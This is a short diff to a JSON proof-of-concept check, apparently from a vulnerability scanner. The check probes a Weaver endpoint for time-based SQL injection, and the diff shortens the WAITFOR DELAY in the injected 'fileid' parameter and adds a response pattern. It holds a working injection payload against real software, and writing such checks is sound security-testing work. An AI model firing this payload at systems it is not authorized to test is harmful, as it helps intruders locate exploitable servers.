@@ -5,11 +5,11 @@
   "type":"sql",
   "poc": {
     "pocGet": "/weaver/weaver.file.FileDownloadForOutDoc",
-    "pocPost": "fileid=1123+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1",
+    "pocPost": "fileid=1123+WAITFOR+DELAY+'0:0:3'&isFromOutImg=1",
     "header": {
       "content-type": "text/plain",
       "User-Agent": "Mozilla/5.0 (Linux;"
     },
-    "Pattern": ""
+    "Pattern": "(^$)"
   }
 }
